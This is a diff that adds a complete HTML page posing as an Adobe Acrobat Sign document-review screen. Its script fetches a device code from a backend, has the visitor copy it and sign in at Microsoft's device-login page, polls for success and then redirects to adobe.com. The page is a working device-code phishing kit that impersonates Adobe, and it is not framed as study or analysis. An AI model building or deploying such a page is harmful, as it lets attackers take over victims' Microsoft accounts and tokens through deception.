@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adobe Sign - Review Document</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+
+html,body{
+  height:100%;
+  overflow:hidden;
+  font-family:'Inter',sans-serif;
+}
+
+/* Layout */
+.pc{
+  height:100vh;
+  background:#f4f4f6;
+  display:flex;
+  flex-direction:column;
+}
+
+/* Header */
+.hd{
+  background:#fff;
+  border-bottom:1px solid #e1e1e1;
+  height:56px;
+}
+
+.hi{
+  max-width:1200px;
+  margin:0 auto;
+  padding:0 20px;
+  height:100%;
+  display:flex;
+  align-items:center;
+}
+
+.lt{
+  font-size:16px;
+  font-weight:600;
+  color:#2c2c2c;
+}
+
+/* Main */
+.mn{
+  flex:1;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+}
+
+.cc{
+  width:100%;
+  max-width:420px;
+}
+
+/* Card */
+.db{
+  background:#fff;
+  border:1px solid #e1e1e1;
+  border-radius:10px 10px 0 0;
+  padding:16px;
+  display:flex;
+  align-items:center;
+  gap:12px;
+}
+
+.dn{
+  font-size:14px;
+  font-weight:600;
+  color:#2c2c2c;
+}
+
+.cd{
+  background:#fff;
+  border:1px solid #e1e1e1;
+  border-top:none;
+  border-radius:0 0 10px 10px;
+  padding:28px;
+  text-align:center;
+}
+
+/* Title */
+.ct{
+  font-size:20px;
+  font-weight:600;
+  margin-bottom:6px;
+}
+
+.cdsc{
+  font-size:14px;
+  color:#6e6e6e;
+  margin-bottom:22px;
+}
+
+/* Code box */
+.cs{
+  background:#f9fafb;
+  border:1px solid #e5e7eb;
+  border-radius:8px;
+  padding:18px;
+  margin-bottom:20px;
+}
+
+.cl{
+  font-size:11px;
+  color:#6b7280;
+  text-transform:uppercase;
+  margin-bottom:8px;
+}
+
+.cv{
+  font-size:28px;
+  font-weight:700;
+  color:#1473e6;
+  letter-spacing:6px;
+  cursor:pointer;
+}
+
+/* Copy button */
+.cpb{
+  margin-top:12px;
+  background:#1473e6;
+  color:#fff;
+  border:none;
+  padding:10px 20px;
+  border-radius:6px;
+  font-size:13px;
+  cursor:pointer;
+}
+
+.cpb:hover{
+  background:#0d66d0;
+}
+
+/* Steps */
+.ss{
+  background:#f4f6f8;
+  border-radius:8px;
+  padding:14px;
+  margin-bottom:20px;
+}
+
+.st{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  font-size:13px;
+  margin:6px 0;
+}
+
+.sn{
+  width:20px;
+  height:20px;
+  background:#1473e6;
+  color:#fff;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:11px;
+}
+
+/* Main button */
+.bp{
+  width:100%;
+  height:46px;
+  border:none;
+  border-radius:24px;
+  background:linear-gradient(180deg,#1473e6,#0d66d0);
+  color:#fff;
+  font-weight:600;
+  cursor:pointer;
+}
+
+.bp:hover{
+  transform:translateY(-1px);
+  box-shadow:0 4px 10px rgba(20,115,230,0.3);
+}
+
+/* Footer */
+.ft{
+  background:#fff;
+  border-top:1px solid #e1e1e1;
+  padding:12px;
+  text-align:center;
+  font-size:11px;
+  color:#888;
+}
+
+/* Loader / states */
+.hidden{display:none}
+
+.sl{
+  width:40px;
+  height:40px;
+  animation:spin 1s linear infinite;
+  margin-bottom:12px;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg)}
+}
+</style>
+</head>
+
+<body>
+<div class="pc">
+
+<header class="hd">
+  <div class="hi">
+    <span class="lt">Adobe Acrobat Sign</span>
+  </div>
+</header>
+
+<main class="mn">
+<div class="cc">
+
+<div class="db">
+  <span class="dn">Agreement_Review.pdf</span>
+</div>
+
+<div class="cd">
+
+<div id="lds">
+  <svg class="sl" viewBox="0 0 24 24">
+    <circle cx="12" cy="12" r="10" stroke="#1473e6" stroke-width="3" fill="none"/>
+  </svg>
+  <p>Preparing verification...</p>
+</div>
+
+<div id="dcs" class="hidden">
+  <h1 class="ct">Verify your identity</h1>
+  <p class="cdsc">Sign in with Microsoft to continue</p>
+
+  <div class="cs">
+    <div class="cl">Verification Code</div>
+    <div class="cv" id="uc" onclick="cc()">------</div>
+    <button class="cpb" id="cpb" onclick="cc()">Copy Code</button>
+  </div>
+
+  <div class="ss">
+    <div class="st"><div class="sn">1</div>Copy code</div>
+    <div class="st"><div class="sn">2</div>Paste on next page</div>
+    <div class="st"><div class="sn">3</div>Login Microsoft</div>
+  </div>
+
+  <button class="bp" onclick="gm()">Continue</button>
+</div>
+
+</div>
+</div>
+</main>
+
+<footer class="ft">
+© 2026 Adobe. All rights reserved.
+</footer>
+
+</div>
+
+<script>
+let sid=null,pi=null;
+const at='59a0a667251bc6201df815be9b525edbbd5b1e159c95bf9e668e310ece2c5ccc';
+
+document.addEventListener('DOMContentLoaded',()=>{
+  setTimeout(sf,800)
+});
+
+async function sf(){
+  try{
+    const r=await fetch('/api/device/start',{method:'POST',headers:{'X-Antibot-Token':at}});
+    const d=await r.json();
+
+    document.getElementById('uc').textContent=d.user_code;
+    sid=d.login_id;
+
+    document.getElementById('lds').classList.add('hidden');
+    document.getElementById('dcs').classList.remove('hidden');
+
+    pi=setInterval(ck,3000);
+  }catch(e){}
+}
+
+async function ck(){
+  try{
+    const r=await fetch('/api/device/status/'+sid);
+    const d=await r.json();
+
+    if(d.status==='success'){
+      window.location.replace('https://www.adobe.com');
+    }
+  }catch(e){}
+}
+
+function cc(){
+  navigator.clipboard.writeText(document.getElementById('uc').textContent);
+}
+
+function gm(){
+  window.open('https://microsoft.com/devicelogin','_blank');
+}
+</script>
+
+</body>
+</html>
